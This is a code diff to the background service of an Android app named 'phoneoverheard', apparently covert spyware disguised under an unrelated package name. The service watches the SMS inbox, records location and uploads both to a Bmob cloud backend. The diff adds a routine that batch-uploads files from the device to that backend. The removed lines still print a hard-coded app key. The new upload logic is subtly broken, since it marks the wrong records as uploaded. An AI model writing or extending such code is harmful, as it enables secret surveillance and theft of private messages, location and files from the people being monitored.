@@ -17,15 +17,20 @@ import android.telephony.SmsMessage;
 import android.util.Log;
 import cn.bmob.v3.Bmob;
 import cn.bmob.v3.BmobObject;
+import cn.bmob.v3.datatype.BmobFile;
 import cn.bmob.v3.datatype.BmobGeoPoint;
 import cn.bmob.v3.listener.SaveListener;
 import cn.linving.girls.MyApplication;
 
+import com.bmob.BmobProFile;
+import com.bmob.btp.callback.UploadBatchListener;
 import com.phoneoverheard.bean.LocNormal;
 import com.phoneoverheard.bean.Sms;
+import com.phoneoverheard.bean.UploadFiles;
 import com.phoneoverheard.bean.User;
 import com.phoneoverheard.db.LocNormalUnit;
 import com.phoneoverheard.db.SmsUnit;
+import com.phoneoverheard.db.UploadFilesUnit;
 import com.phoneoverheard.interfaces.Constant;
 import com.phoneoverheard.util.StringUtils;
 import com.phoneoverheard.util.Util;
@@ -37,10 +42,11 @@ public class BackService extends Service {
 	private SmsObserver smsObserver;
 	private LocNormalUnit locNormalUnit;
 	private SmsUnit smsUnit;
+	private UploadFilesUnit uploadFilesUnit;
 	private Handler handler;
 	// 正在检测上传
 	private boolean isChecking = false;
-	
+
 	private User user;
 
 	@Override
@@ -66,7 +72,7 @@ public class BackService extends Service {
 		// 开启定时检查
 		AlarmReceiver.startRepeatAlarmer(this, Constant.ALARM_INTERVAL_HOUR_TO_CHECK_SUBMIT);
 
-		Bmob.initialize(getApplicationContext(), "404e868375438ee2f3b5f0d2a37e4d14");
+		Bmob.initialize(getApplicationContext(), Constant.BMOB_APP_ID);
 
 		locNormalUnit = new LocNormalUnit(context);
 
@@ -81,7 +87,9 @@ public class BackService extends Service {
 				case Constant.MSG_CODE_CHECK_SMS:
 					checkSms();
 					break;
-
+				case Constant.MSG_CODE_CHECK_FILE_UPLOAD:
+					checkFileUpload();
+					break;
 				default:
 					break;
 				}
@@ -93,7 +101,7 @@ public class BackService extends Service {
 		smsObserver = new SmsObserver(context, handler);
 		getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
 		smsObserver.checkSmsBoxFirstTime();
-		
+
 		user = MyApplication.getInstance().user;
 
 		super.onCreate();
@@ -120,11 +128,15 @@ public class BackService extends Service {
 	 * @date 2015-9-16 void
 	 */
 	private void checkLocNormal() {
+		
+		if(isChecking){
+			return;
+		}
 
 		isChecking = true;
-		
+
 		String objectId = "null";
-		if(null != user){
+		if (null != user) {
 			objectId = user.getObjectId();
 		}
 
@@ -163,6 +175,7 @@ public class BackService extends Service {
 				@Override
 				public void onFailure(int arg0, String arg1) {
 					// TODO Auto-generated method stub
+					isChecking = false;
 				}
 			});
 		} else {
@@ -172,6 +185,7 @@ public class BackService extends Service {
 
 	private void checkSms() {
 
+		isChecking = true;
 		// 获取10条定位数据，小于10条则没有最新的数据，进入下一项上传任务
 		final List<Sms> list = smsUnit.getUnuploadDatas();
 		// 是否继续读取数据库上传
@@ -198,6 +212,7 @@ public class BackService extends Service {
 				@Override
 				public void onFailure(int arg0, String arg1) {
 					// TODO Auto-generated method stub
+					isChecking = false;
 				}
 			});
 		} else {
@@ -207,6 +222,79 @@ public class BackService extends Service {
 	}
 
 	private void checkFileUpload() {
+
+		isChecking = true;
+
+		// 获取10条定位数据，小于10条则没有最新的数据，进入下一项上传任务
+		final List<UploadFiles> list = uploadFilesUnit.getUnuploadFiles();
+		// 是否继续读取数据库上传
+
+		if (null != list) {
+
+			String[] paths = uploadFilesUnit.getFilesPathByList(list);
+			// 批量上传是会依次上传文件夹里面的文件
+			BmobProFile.getInstance(context).uploadBatch(paths, new UploadBatchListener() {
+
+				@Override
+				public void onSuccess(boolean isFinish, String[] fileNames, String[] urls, BmobFile[] files) {
+					// TODO Auto-generated method stub
+					if (isFinish) {
+
+						List<BmobObject> uploads = new ArrayList<BmobObject>();
+
+						for (BmobFile file : files) {
+
+							for (UploadFiles tmp : list) {
+								if (file.getFilename().equals(tmp.getFileName())) {
+
+									uploads.add(tmp);
+									list.remove(tmp);
+									break;
+								}
+							}
+						}
+
+						new BmobObject().insertBatch(context, uploads, new SaveListener() {
+
+							@Override
+							public void onSuccess() {
+								// TODO Auto-generated method stub
+								// 多线程异常
+								new UploadFilesUnit(context).updateUploadSuccess(list);
+
+								if (list.size() == 10) {
+									handler.sendEmptyMessage(Constant.MSG_CODE_CHECK_FILE_UPLOAD);
+								} else {
+
+								}
+							}
+
+							@Override
+							public void onFailure(int arg0, String arg1) {
+								// TODO Auto-generated method stub
+								isChecking = false;
+							}
+						});
+					}
+				}
+
+				@Override
+				public void onProgress(int curIndex, int curPercent, int total, int totalPercent) {
+					// TODO Auto-generated method stub
+
+				}
+
+				@Override
+				public void onError(int statuscode, String errormsg) {
+					// TODO Auto-generated method stub
+
+				}
+
+			});
+
+		} else {
+			isChecking = false;
+		}
 	}
 
 	/**
